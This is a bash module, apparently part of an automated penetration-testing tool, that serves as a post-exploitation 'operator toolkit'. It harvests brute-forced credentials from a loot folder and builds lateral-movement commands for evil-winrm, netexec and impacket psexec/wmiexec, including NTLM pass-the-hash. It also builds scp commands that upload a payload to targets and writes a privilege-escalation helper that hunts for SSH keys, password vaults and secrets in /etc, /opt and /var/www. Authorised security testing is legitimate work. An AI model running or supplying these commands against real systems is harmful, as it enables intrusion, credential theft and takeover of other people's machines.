#!/bin/bash
# ============================================================================
# AUTO RECON - Phase 7: Operator Toolkit
# ============================================================================

operator_toolkit_dir() {
    local result_dir="$1"
    echo "${result_dir}/toolkit"
}

ensure_operator_toolkit_layout() {
    local result_dir="$1"
    local toolkit_dir
    toolkit_dir=$(operator_toolkit_dir "$result_dir")
    mkdir -p "${toolkit_dir}/helpers"
    mkdir -p "${toolkit_dir}/sessions"
}

operator_toolkit_first_binary() {
    local candidate=""
    for candidate in "$@"; do
        if command -v "$candidate" &>/dev/null; then
            echo "$candidate"
            return 0
        fi
    done
    return 1
}

operator_toolkit_default_host() {
    local ip="$1"
    local preferred="${TARGET_DOMAIN:-}"
    if [[ -n "$preferred" && "$preferred" != "$ip" ]]; then
        echo "$preferred"
    else
        echo "$ip"
    fi
}

operator_toolkit_domain_is_local() {
    local domain="$1"
    [[ -z "$domain" || "$domain" == "." ]]
}

operator_toolkit_prompt_value() {
    local label="$1"
    local default_value="$2"
    local input=""

    if [[ -n "$default_value" ]]; then
        echo -ne "  ${BOLD}${label} [default: ${default_value}]:${NC} "
    else
        echo -ne "  ${BOLD}${label}:${NC} "
    fi
    read -r input

    if [[ -n "$input" ]]; then
        echo "$input"
    else
        echo "$default_value"
    fi
}

operator_toolkit_ports_from_nmap() {
    local nmap_file="$1"
    local mode="$2"
    [[ -f "$nmap_file" ]] || return 0

    awk -v mode="$mode" '
        /^[0-9]/ && $2 == "open" {
            split($1, a, "/")
            port=a[1]
            svc=tolower($3)

            if (mode == "ssh" && svc ~ /^(ssh)$/) print port
            else if (mode == "smb" && svc ~ /^(microsoft-ds|netbios-ssn|smb)$/) print port
            else if (mode == "rdp" && (svc ~ /^(ms-wbt-server|rdp)$/ || port == "3389")) print port
            else if (mode == "winrm" && (svc ~ /(wsman|winrm)/ || port == "5985" || port == "5986")) print port
        }
    ' "$nmap_file" | sort -un | paste -sd, -
}

operator_toolkit_record_command() {
    local result_dir="$1"
    local label="$2"
    shift 2
    local toolkit_dir
    toolkit_dir=$(operator_toolkit_dir "$result_dir")
    local history_file="${toolkit_dir}/sessions/generated_commands.txt"
    local preview
    preview=$(format_command_preview "$@")

    {
        printf '[%s] %s\n' "$(date '+%Y-%m-%d %H:%M:%S %Z')" "$label"
        printf '%s\n\n' "$preview"
    } >> "$history_file"

    echo -e "  ${DIM}Saved to ${history_file}${NC}"
}

operator_toolkit_write_helper() {
    local result_dir="$1"
    local helper_name="$2"
    local content="$3"
    local toolkit_dir
    toolkit_dir=$(operator_toolkit_dir "$result_dir")
    local helper_file="${toolkit_dir}/helpers/${helper_name}"

    printf '%s\n' "$content" > "$helper_file"
    echo "$helper_file"
}

operator_toolkit_refresh_credentials() {
    local result_dir="$1"
    local toolkit_dir
    toolkit_dir=$(operator_toolkit_dir "$result_dir")
    local cache_file="${toolkit_dir}/credential_cache.tsv"
    local loot_dir="${result_dir}/loot"
    local file=""
    local line=""

    : > "$cache_file"
    [[ -d "$loot_dir" ]] || return 0

    for file in "${loot_dir}"/*_brute.txt "${loot_dir}"/web_brute.txt; do
        [[ -f "$file" ]] || continue
        while IFS= read -r line; do
            if [[ "$line" =~ ^\[([0-9]+)\]\[([^]]+)\][[:space:]]+host:[[:space:]]+([^[:space:]]+).*[[:space:]]login:[[:space:]]+([^[:space:]]+)[[:space:]]+password:[[:space:]]+(.*)$ ]]; then
                printf '%s\t%s\t%s\t%s\t%s\t%s\n' \
                    "${BASH_REMATCH[2]}" \
                    "${BASH_REMATCH[1]}" \
                    "${BASH_REMATCH[3]}" \
                    "${BASH_REMATCH[4]}" \
                    "${BASH_REMATCH[5]}" \
                    "$(basename "$file")" >> "$cache_file"
            fi
        done < "$file"
    done

    dedup_file "$cache_file"
}

operator_toolkit_credential_count() {
    local result_dir="$1"
    local toolkit_dir
    toolkit_dir=$(operator_toolkit_dir "$result_dir")
    local cache_file="${toolkit_dir}/credential_cache.tsv"
    [[ -f "$cache_file" ]] || {
        echo 0
        return 0
    }
    wc -l < "$cache_file" 2>/dev/null || echo 0
}

operator_toolkit_generate_summary() {
    local result_dir="$1"
    local toolkit_dir
    toolkit_dir=$(operator_toolkit_dir "$result_dir")
    local cache_file="${toolkit_dir}/credential_cache.tsv"
    local history_file="${toolkit_dir}/sessions/generated_commands.txt"
    local summary_file="${toolkit_dir}/summary.txt"
    local target_context_file="${result_dir}/state/target_context.env"
    local target_display=""
    local helper_count=0
    local cred_count=0
    local command_count=0

    target_display=$(read_metadata_value "$target_context_file" target_display 2>/dev/null || true)
    [[ -z "$target_display" ]] && target_display="${TARGET_DISPLAY:-${TARGET:-unknown}}"
    [[ -f "$cache_file" ]] && cred_count=$(wc -l < "$cache_file" 2>/dev/null || echo 0)
    [[ -f "$history_file" ]] && command_count=$(grep -c '^\[' "$history_file" 2>/dev/null || echo 0)
    helper_count=$(find "${toolkit_dir}/helpers" -maxdepth 1 -type f -name '*.txt' 2>/dev/null | wc -l)

    {
        echo "=== Operator Toolkit Summary ==="
        echo "Generated: $(date)"
        echo "Target: ${target_display}"
        echo "Credential Cache Entries: ${cred_count}"
        echo "Generated Commands: ${command_count}"
        echo "Helper Files: ${helper_count}"
        echo ""

        if [[ -f "$cache_file" ]] && [[ -s "$cache_file" ]]; then
            echo "Credential Cache Preview:"
            awk -F'\t' '{ printf "%s\t%s\t%s\t%s\t%s\t%s\n", $1, $2, $3, $4, $5, $6 }' "$cache_file" | head -n 12
            echo ""
        fi

        if [[ -f "$history_file" ]] && [[ -s "$history_file" ]]; then
            echo "Recent Commands:"
            tail -n 20 "$history_file"
        fi
    } > "$summary_file"
}

operator_toolkit_show_summary() {
    local result_dir="$1"
    local toolkit_dir
    toolkit_dir=$(operator_toolkit_dir "$result_dir")
    operator_toolkit_generate_summary "$result_dir"

    if [[ -f "${toolkit_dir}/summary.txt" ]]; then
        cat "${toolkit_dir}/summary.txt"
    else
        log_info "No operator toolkit summary yet."
    fi
}

operator_toolkit_show_credentials() {
    local result_dir="$1"
    local toolkit_dir
    toolkit_dir=$(operator_toolkit_dir "$result_dir")
    local cache_file="${toolkit_dir}/credential_cache.tsv"

    if [[ ! -s "$cache_file" ]]; then
        log_info "No brute-force credential artifacts found yet."
        return 0
    fi

    sub_header "Credential Cache"
    awk -F'\t' '
        {
            printf "  [%d] %-8s %-5s %-18s %s / %s (%s)\n", NR, $1, $2, $3, $4, $5, $6
        }
    ' "$cache_file"
}

operator_toolkit_select_cached_credential() {
    local result_dir="$1"
    local service_hint="${2:-}"
    local toolkit_dir
    toolkit_dir=$(operator_toolkit_dir "$result_dir")
    local cache_file="${toolkit_dir}/credential_cache.tsv"
    local -a rows=()
    local line=""
    local idx=1
    local selection=""

    TOOLKIT_AUTH_USER=""
    TOOLKIT_AUTH_SECRET=""
    TOOLKIT_AUTH_SOURCE="manual"
    TOOLKIT_AUTH_SERVICE=""
    TOOLKIT_AUTH_PORT=""
    TOOLKIT_AUTH_HOST=""

    [[ -s "$cache_file" ]] || return 1

    while IFS= read -r line; do
        [[ -z "$line" ]] && continue
        if [[ -n "$service_hint" ]]; then
            local row_service="${line%%$'\t'*}"
            [[ "$row_service" != "$service_hint" ]] && continue
        fi
        rows+=("$line")
    done < "$cache_file"

    [[ ${#rows[@]} -gt 0 ]] || return 1

    echo -e "  ${BOLD}${CYAN}  Cached Credentials${NC}"
    for line in "${rows[@]}"; do
        IFS=$'\t' read -r cred_service cred_port cred_host cred_user cred_secret cred_source <<< "$line"
        echo -e "  ${CYAN}[${idx}]${NC} ${cred_service}@${cred_host}:${cred_port} ${DIM}${cred_user} / ${cred_secret} (${cred_source})${NC}"
        idx=$((idx + 1))
    done
    echo -e "  ${CYAN}[0]${NC} Manual entry"
    echo -ne "  ${BOLD}Choose credential [default: 1]:${NC} "
    read -r selection

    if [[ "$selection" == "0" ]]; then
        return 1
    fi

    if [[ -z "$selection" ]]; then
        selection=1
    fi

    if [[ ! "$selection" =~ ^[0-9]+$ ]] || (( selection < 1 || selection > ${#rows[@]} )); then
        return 1
    fi

    IFS=$'\t' read -r TOOLKIT_AUTH_SERVICE TOOLKIT_AUTH_PORT TOOLKIT_AUTH_HOST TOOLKIT_AUTH_USER TOOLKIT_AUTH_SECRET TOOLKIT_AUTH_SOURCE <<< "${rows[$((selection - 1))]}"
    return 0
}

operator_toolkit_collect_windows_auth() {
    local result_dir="$1"
    local service_hint="${2:-}"
    local allow_hashes="${3:-true}"
    local default_domain="${4:-.}"

    TOOLKIT_AUTH_MODE="password"
    TOOLKIT_AUTH_DOMAIN="$default_domain"
    TOOLKIT_AUTH_USER=""
    TOOLKIT_AUTH_SECRET=""
    TOOLKIT_AUTH_SOURCE="manual"

    operator_toolkit_select_cached_credential "$result_dir" "$service_hint" || true

    local cached_user="${TOOLKIT_AUTH_USER}"
    local cached_secret="${TOOLKIT_AUTH_SECRET}"
    local cached_domain="$default_domain"
    local auth_choice=""

    echo -e "  ${CYAN}[1]${NC} Password ${DIM}(recommended)${NC}"
    if [[ "$allow_hashes" == "true" ]]; then
        echo -e "  ${CYAN}[2]${NC} NTLM hash"
    fi
    echo -ne "  ${BOLD}Auth material [default: 1]:${NC} "
    read -r auth_choice

    if [[ "$allow_hashes" == "true" && "$auth_choice" == "2" ]]; then
        TOOLKIT_AUTH_MODE="hash"
    fi

    TOOLKIT_AUTH_DOMAIN=$(operator_toolkit_prompt_value "Domain/workgroup (. for local auth)" "$cached_domain")
    TOOLKIT_AUTH_USER=$(operator_toolkit_prompt_value "Username" "$cached_user")

    if [[ "$TOOLKIT_AUTH_MODE" == "hash" ]]; then
        TOOLKIT_AUTH_SECRET=$(operator_toolkit_prompt_value "NTLM hash" "$cached_secret")
    else
        TOOLKIT_AUTH_SECRET=$(operator_toolkit_prompt_value "Password" "$cached_secret")
    fi
}

operator_toolkit_collect_linux_auth() {
    local result_dir="$1"
    local linux_auth_choice=""

    TOOLKIT_LINUX_AUTH_MODE="password"
    TOOLKIT_LINUX_USER=""
    TOOLKIT_LINUX_SECRET=""
    TOOLKIT_LINUX_IDENTITY=""

    operator_toolkit_select_cached_credential "$result_dir" "ssh" || true
    local cached_user="${TOOLKIT_AUTH_USER}"

    echo -e "  ${CYAN}[1]${NC} Password / keyboard-interactive ${DIM}(recommended)${NC}"
    echo -e "  ${CYAN}[2]${NC} SSH private key"
    echo -ne "  ${BOLD}Auth method [default: 1]:${NC} "
    read -r linux_auth_choice

    if [[ "$linux_auth_choice" == "2" ]]; then
        TOOLKIT_LINUX_AUTH_MODE="key"
    fi

    TOOLKIT_LINUX_USER=$(operator_toolkit_prompt_value "Username" "$cached_user")
    if [[ "$TOOLKIT_LINUX_AUTH_MODE" == "key" ]]; then
        TOOLKIT_LINUX_IDENTITY=$(operator_toolkit_prompt_value "Identity file" "~/.ssh/id_rsa")
    else
        TOOLKIT_LINUX_SECRET=$(operator_toolkit_prompt_value "Password hint for your notes" "")
    fi
}

operator_toolkit_build_windows_command() {
    local ip="$1"
    local result_dir="$2"
    local nmap_file="${result_dir}/scans/nmap_targeted.nmap"
    local smb_ports=""
    local winrm_ports=""
    local rdp_ports=""
    local evil_bin=""
    local netexec_bin=""
    local wmiexec_bin=""
    local psexec_bin=""
    local smbexec_bin=""
    local xfreerdp_bin=""
    local smbclient_bin=""
    local rpcclient_bin=""
    local -a labels=()
    local -a values=()
    local count=0
    local choice=""
    local host_default
    local host=""
    local port=""
    local share_name=""
    local remote_path=""

    host_default=$(operator_toolkit_default_host "$ip")
    smb_ports=$(operator_toolkit_ports_from_nmap "$nmap_file" "smb")
    winrm_ports=$(operator_toolkit_ports_from_nmap "$nmap_file" "winrm")
    rdp_ports=$(operator_toolkit_ports_from_nmap "$nmap_file" "rdp")

    evil_bin=$(operator_toolkit_first_binary evil-winrm || true)
    netexec_bin=$(operator_toolkit_first_binary netexec nxc || true)
    wmiexec_bin=$(operator_toolkit_first_binary impacket-wmiexec wmiexec.py || true)
    psexec_bin=$(operator_toolkit_first_binary impacket-psexec psexec.py || true)
    smbexec_bin=$(operator_toolkit_first_binary impacket-smbexec smbexec.py || true)
    xfreerdp_bin=$(operator_toolkit_first_binary xfreerdp xfreerdp3 || true)
    smbclient_bin=$(operator_toolkit_first_binary smbclient || true)
    rpcclient_bin=$(operator_toolkit_first_binary rpcclient || true)

    echo -e "${BOLD}${CYAN}  🪟 Windows Operator Toolkit${NC}"

    if [[ -n "$evil_bin" ]]; then
        count=$((count + 1))
        labels+=("evil-winrm ${DIM}(WinRM: ${winrm_ports:-5985/5986})${NC}")
        values+=("evil-winrm")
    fi
    if [[ -n "$netexec_bin" ]]; then
        count=$((count + 1))
        labels+=("netexec smb ${DIM}(SMB: ${smb_ports:-445})${NC}")
        values+=("netexec-smb")
        count=$((count + 1))
        labels+=("netexec winrm ${DIM}(WinRM: ${winrm_ports:-5985/5986})${NC}")
        values+=("netexec-winrm")
    fi
    if [[ -n "$wmiexec_bin" ]]; then
        count=$((count + 1))
        labels+=("impacket wmiexec ${DIM}(SMB/DCOM: ${smb_ports:-445})${NC}")
        values+=("wmiexec")
    fi
    if [[ -n "$psexec_bin" ]]; then
        count=$((count + 1))
        labels+=("impacket psexec ${DIM}(SMB service exec: ${smb_ports:-445})${NC}")
        values+=("psexec")
    fi
    if [[ -n "$smbexec_bin" ]]; then
        count=$((count + 1))
        labels+=("impacket smbexec ${DIM}(SMB semi-interactive: ${smb_ports:-445})${NC}")
        values+=("smbexec")
    fi
    if [[ -n "$xfreerdp_bin" ]]; then
        count=$((count + 1))
        labels+=("xfreerdp ${DIM}(RDP: ${rdp_ports:-3389})${NC}")
        values+=("xfreerdp")
    fi
    if [[ -n "$smbclient_bin" ]]; then
        count=$((count + 1))
        labels+=("smbclient ${DIM}(share listing / access: ${smb_ports:-445})${NC}")
        values+=("smbclient")
    fi
    if [[ -n "$rpcclient_bin" ]]; then
        count=$((count + 1))
        labels+=("rpcclient ${DIM}(SAMR/LSARPC queries: ${smb_ports:-445})${NC}")
        values+=("rpcclient")
    fi

    if [[ ${#values[@]} -eq 0 ]]; then
        log_warn "No Windows operator tools are installed locally."
        return 1
    fi

    local idx=1
    for label in "${labels[@]}"; do
        echo -e "  ${CYAN}[${idx}]${NC} ${label}"
        idx=$((idx + 1))
    done
    echo -e "  ${CYAN}[0]${NC} Return"
    echo -ne "  ${BOLD}Choose tool [default: 1]:${NC} "
    read -r choice

    [[ -z "$choice" ]] && choice=1
    if [[ "$choice" == "0" ]]; then
        return 0
    fi
    if [[ ! "$choice" =~ ^[0-9]+$ ]] || (( choice < 1 || choice > ${#values[@]} )); then
        log_warn "Invalid selection"
        return 1
    fi

    case "${values[$((choice - 1))]}" in
        evil-winrm)
            host=$(operator_toolkit_prompt_value "Target host" "$host_default")
            port=$(choose_service_port "WinRM" "$winrm_ports" "5985")
            operator_toolkit_collect_windows_auth "$result_dir" "" "true" "."
            local -a cmd=("$evil_bin" -i "$host" -P "$port" -u "$TOOLKIT_AUTH_USER")
            if [[ "$TOOLKIT_AUTH_MODE" == "hash" ]]; then
                cmd+=(-H "$TOOLKIT_AUTH_SECRET")
            else
                cmd+=(-p "$TOOLKIT_AUTH_SECRET")
            fi
            log_command_preview "${cmd[@]}"
            operator_toolkit_record_command "$result_dir" "evil-winrm" "${cmd[@]}"
            ;;
        netexec-smb)
            host=$(operator_toolkit_prompt_value "Target host" "$host_default")
            port=$(choose_service_port "SMB" "$smb_ports" "445")
            operator_toolkit_collect_windows_auth "$result_dir" "smb" "true" "."
            local -a cmd=("$netexec_bin" smb "$host" --port "$port" -u "$TOOLKIT_AUTH_USER")
            if operator_toolkit_domain_is_local "$TOOLKIT_AUTH_DOMAIN"; then
                cmd+=(--local-auth)
            else
                cmd+=(-d "$TOOLKIT_AUTH_DOMAIN")
            fi
            if [[ "$TOOLKIT_AUTH_MODE" == "hash" ]]; then
                cmd+=(-H "$TOOLKIT_AUTH_SECRET")
            else
                cmd+=(-p "$TOOLKIT_AUTH_SECRET")
            fi
            log_command_preview "${cmd[@]}"
            operator_toolkit_record_command "$result_dir" "netexec smb" "${cmd[@]}"
            ;;
        netexec-winrm)
            host=$(operator_toolkit_prompt_value "Target host" "$host_default")
            port=$(choose_service_port "WinRM" "$winrm_ports" "5985")
            operator_toolkit_collect_windows_auth "$result_dir" "" "true" "."
            local -a cmd=("$netexec_bin" winrm "$host" --port "$port" -u "$TOOLKIT_AUTH_USER")
            if operator_toolkit_domain_is_local "$TOOLKIT_AUTH_DOMAIN"; then
                cmd+=(--local-auth)
            else
                cmd+=(-d "$TOOLKIT_AUTH_DOMAIN")
            fi
            if [[ "$TOOLKIT_AUTH_MODE" == "hash" ]]; then
                cmd+=(-H "$TOOLKIT_AUTH_SECRET")
            else
                cmd+=(-p "$TOOLKIT_AUTH_SECRET")
            fi
            log_command_preview "${cmd[@]}"
            operator_toolkit_record_command "$result_dir" "netexec winrm" "${cmd[@]}"
            ;;
        wmiexec|psexec|smbexec)
            host=$(operator_toolkit_prompt_value "Target host" "$host_default")
            operator_toolkit_collect_windows_auth "$result_dir" "smb" "true" "."
            local impacket_bin=""
            case "${values[$((choice - 1))]}" in
                wmiexec) impacket_bin="$wmiexec_bin" ;;
                psexec) impacket_bin="$psexec_bin" ;;
                smbexec) impacket_bin="$smbexec_bin" ;;
            esac
            local target_string
            if operator_toolkit_domain_is_local "$TOOLKIT_AUTH_DOMAIN"; then
                target_string="${TOOLKIT_AUTH_USER}@${host}"
            else
                target_string="${TOOLKIT_AUTH_DOMAIN}/${TOOLKIT_AUTH_USER}@${host}"
            fi
            local -a cmd=("$impacket_bin")
            if [[ "$TOOLKIT_AUTH_MODE" == "hash" ]]; then
                cmd+=(-hashes ":${TOOLKIT_AUTH_SECRET}" "$target_string")
            else
                if operator_toolkit_domain_is_local "$TOOLKIT_AUTH_DOMAIN"; then
                    target_string="${TOOLKIT_AUTH_USER}:${TOOLKIT_AUTH_SECRET}@${host}"
                else
                    target_string="${TOOLKIT_AUTH_DOMAIN}/${TOOLKIT_AUTH_USER}:${TOOLKIT_AUTH_SECRET}@${host}"
                fi
                cmd+=("$target_string")
            fi
            log_command_preview "${cmd[@]}"
            operator_toolkit_record_command "$result_dir" "${values[$((choice - 1))]}" "${cmd[@]}"
            ;;
        xfreerdp)
            host=$(operator_toolkit_prompt_value "Target host" "$host_default")
            port=$(choose_service_port "RDP" "$rdp_ports" "3389")
            operator_toolkit_collect_windows_auth "$result_dir" "" "false" "."
            local -a cmd=("$xfreerdp_bin" "/v:${host}:${port}" "/u:${TOOLKIT_AUTH_USER}" "/cert:ignore")
            if ! operator_toolkit_domain_is_local "$TOOLKIT_AUTH_DOMAIN"; then
                cmd+=("/d:${TOOLKIT_AUTH_DOMAIN}")
            fi
            [[ -n "$TOOLKIT_AUTH_SECRET" ]] && cmd+=("/p:${TOOLKIT_AUTH_SECRET}")
            log_command_preview "${cmd[@]}"
            operator_toolkit_record_command "$result_dir" "xfreerdp" "${cmd[@]}"
            ;;
        smbclient)
            host=$(operator_toolkit_prompt_value "Target host" "$host_default")
            port=$(choose_service_port "SMB" "$smb_ports" "445")
            operator_toolkit_collect_windows_auth "$result_dir" "smb" "false" "."
            share_name=$(operator_toolkit_prompt_value "Share name (leave blank for -L listing)" "")
            local auth_string="${TOOLKIT_AUTH_USER}%${TOOLKIT_AUTH_SECRET}"
            if ! operator_toolkit_domain_is_local "$TOOLKIT_AUTH_DOMAIN"; then
                auth_string="${TOOLKIT_AUTH_DOMAIN}\\${TOOLKIT_AUTH_USER}%${TOOLKIT_AUTH_SECRET}"
            fi
            local -a cmd=("$smbclient_bin")
            if [[ -n "$share_name" ]]; then
                cmd+=("//${host}/${share_name}")
            else
                cmd+=(-L "//${host}/")
            fi
            cmd+=(-U "$auth_string" -p "$port")
            log_command_preview "${cmd[@]}"
            operator_toolkit_record_command "$result_dir" "smbclient" "${cmd[@]}"
            ;;
        rpcclient)
            host=$(operator_toolkit_prompt_value "Target host" "$host_default")
            port=$(choose_service_port "SMB" "$smb_ports" "445")
            operator_toolkit_collect_windows_auth "$result_dir" "smb" "false" "."
            local auth_string="${TOOLKIT_AUTH_USER}%${TOOLKIT_AUTH_SECRET}"
            if ! operator_toolkit_domain_is_local "$TOOLKIT_AUTH_DOMAIN"; then
                auth_string="${TOOLKIT_AUTH_DOMAIN}\\${TOOLKIT_AUTH_USER}%${TOOLKIT_AUTH_SECRET}"
            fi
            local -a cmd=("$rpcclient_bin" -U "$auth_string" -p "$port" "$host")
            log_command_preview "${cmd[@]}"
            operator_toolkit_record_command "$result_dir" "rpcclient" "${cmd[@]}"
            ;;
    esac

    return 0
}

operator_toolkit_build_linux_command() {
    local ip="$1"
    local result_dir="$2"
    local nmap_file="${result_dir}/scans/nmap_targeted.nmap"
    local ssh_ports=""
    local host_default
    local host=""
    local port=""
    local choice=""
    local local_path=""
    local remote_path=""

    ssh_ports=$(operator_toolkit_ports_from_nmap "$nmap_file" "ssh")
    host_default=$(operator_toolkit_default_host "$ip")

    echo -e "${BOLD}${CYAN}  🐧 Linux Operator Toolkit${NC}"
    echo -e "  ${CYAN}[1]${NC} ssh shell"
    echo -e "  ${CYAN}[2]${NC} scp download"
    echo -e "  ${CYAN}[3]${NC} scp upload"
    echo -e "  ${CYAN}[4]${NC} Linux priv-esc helper set"
    echo -e "  ${CYAN}[0]${NC} Return"
    echo -ne "  ${BOLD}Choose tool [default: 1]:${NC} "
    read -r choice

    [[ -z "$choice" ]] && choice=1
    if [[ "$choice" == "0" ]]; then
        return 0
    fi

    case "$choice" in
        1)
            host=$(operator_toolkit_prompt_value "Target host" "$host_default")
            port=$(choose_service_port "SSH" "$ssh_ports" "22")
            operator_toolkit_collect_linux_auth "$result_dir"
            local -a cmd=(ssh -p "$port")
            if [[ "$TOOLKIT_LINUX_AUTH_MODE" == "key" ]]; then
                cmd+=(-i "$TOOLKIT_LINUX_IDENTITY")
            fi
            cmd+=("${TOOLKIT_LINUX_USER}@${host}")
            log_command_preview "${cmd[@]}"
            if [[ -n "$TOOLKIT_LINUX_SECRET" ]]; then
                echo -e "  ${DIM}Password hint recorded in your prompt flow; ssh itself remains interactive.${NC}"
            fi
            operator_toolkit_record_command "$result_dir" "ssh" "${cmd[@]}"
            ;;
        2)
            host=$(operator_toolkit_prompt_value "Target host" "$host_default")
            port=$(choose_service_port "SSH" "$ssh_ports" "22")
            operator_toolkit_collect_linux_auth "$result_dir"
            remote_path=$(operator_toolkit_prompt_value "Remote path" "/tmp/")
            local_path=$(operator_toolkit_prompt_value "Local destination" "./")
            local -a cmd=(scp -P "$port")
            if [[ "$TOOLKIT_LINUX_AUTH_MODE" == "key" ]]; then
                cmd+=(-i "$TOOLKIT_LINUX_IDENTITY")
            fi
            cmd+=("${TOOLKIT_LINUX_USER}@${host}:${remote_path}" "$local_path")
            log_command_preview "${cmd[@]}"
            operator_toolkit_record_command "$result_dir" "scp download" "${cmd[@]}"
            ;;
        3)
            host=$(operator_toolkit_prompt_value "Target host" "$host_default")
            port=$(choose_service_port "SSH" "$ssh_ports" "22")
            operator_toolkit_collect_linux_auth "$result_dir"
            local_path=$(operator_toolkit_prompt_value "Local file to upload" "./payload.bin")
            remote_path=$(operator_toolkit_prompt_value "Remote destination" "/tmp/payload.bin")
            local -a cmd=(scp -P "$port")
            if [[ "$TOOLKIT_LINUX_AUTH_MODE" == "key" ]]; then
                cmd+=(-i "$TOOLKIT_LINUX_IDENTITY")
            fi
            cmd+=("$local_path" "${TOOLKIT_LINUX_USER}@${host}:${remote_path}")
            log_command_preview "${cmd[@]}"
            operator_toolkit_record_command "$result_dir" "scp upload" "${cmd[@]}"
            ;;
        4)
            operator_toolkit_build_linux_privesc_helper "$ip" "$result_dir"
            ;;
        *)
            log_warn "Invalid selection"
            return 1
            ;;
    esac

    return 0
}

operator_toolkit_build_linux_privesc_helper() {
    local ip="$1"
    local result_dir="$2"
    local helper_file=""
    local host_default
    host_default=$(operator_toolkit_default_host "$ip")
    local host_hint
    host_hint=$(operator_toolkit_prompt_value "Host label for helper notes" "$host_default")

    helper_file=$(operator_toolkit_write_helper "$result_dir" "linux_privesc_$(sanitize_filename_component "$host_hint").txt" "$(cat <<EOF
# Linux privilege-escalation helper set for ${host_hint}
# Review each command before use.

id
whoami
hostname
uname -a
cat /etc/os-release
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
ps aux --forest
ss -tulpn
crontab -l
ls -lah /etc/cron* /var/spool/cron 2>/dev/null
find / -writable -type d 2>/dev/null | head -n 50
find / -name '*.kdbx' -o -name '*.ovpn' -o -name 'id_rsa' 2>/dev/null
grep -RniE 'pass(word)?|token|secret|api[_-]?key' /etc /opt /var/www 2>/dev/null | head -n 100
EOF
)")

    print_found "Linux priv-esc helper saved → ${helper_file}"
    return 0
}

run_operator_toolkit() {
    local ip="$1"
    local result_dir="$2"
    local toolkit_dir
    toolkit_dir=$(operator_toolkit_dir "$result_dir")
    local choice=""

    ensure_operator_toolkit_layout "$result_dir"
    operator_toolkit_refresh_credentials "$result_dir"

    while true; do
        local cred_count
        cred_count=$(operator_toolkit_credential_count "$result_dir")

        section_header "PHASE 7: OPERATOR TOOLKIT"
        echo -e "  ${DIM}Outputs: ${toolkit_dir}${NC}"
        echo -e "  ${CYAN}[1]${NC} Review cached credentials ${DIM}(${cred_count})${NC}"
        echo -e "  ${CYAN}[2]${NC} Build Windows operator command"
        echo -e "  ${CYAN}[3]${NC} Build Linux operator command"
        echo -e "  ${CYAN}[4]${NC} Refresh credential cache from loot/"
        echo -e "  ${CYAN}[0]${NC} Return"
        echo -ne "  ${BOLD}Choose [0-4, default: 1]:${NC} "
        read -r choice

        [[ -z "$choice" ]] && choice=1

        case "$choice" in
            1)
                operator_toolkit_show_credentials "$result_dir"
                echo ""
                operator_toolkit_show_summary "$result_dir"
                ;;
            2)
                operator_toolkit_build_windows_command "$ip" "$result_dir"
                echo ""
                operator_toolkit_show_summary "$result_dir"
                ;;
            3)
                operator_toolkit_build_linux_command "$ip" "$result_dir"
                echo ""
                operator_toolkit_show_summary "$result_dir"
                ;;
            4)
                operator_toolkit_refresh_credentials "$result_dir"
                log_success "Credential cache refreshed → ${toolkit_dir}/credential_cache.tsv"
                echo ""
                operator_toolkit_show_summary "$result_dir"
                ;;
            0|q|Q)
                break
                ;;
            *)
                log_warn "Invalid selection"
                ;;
        esac

        echo ""
    done

    return 0
}
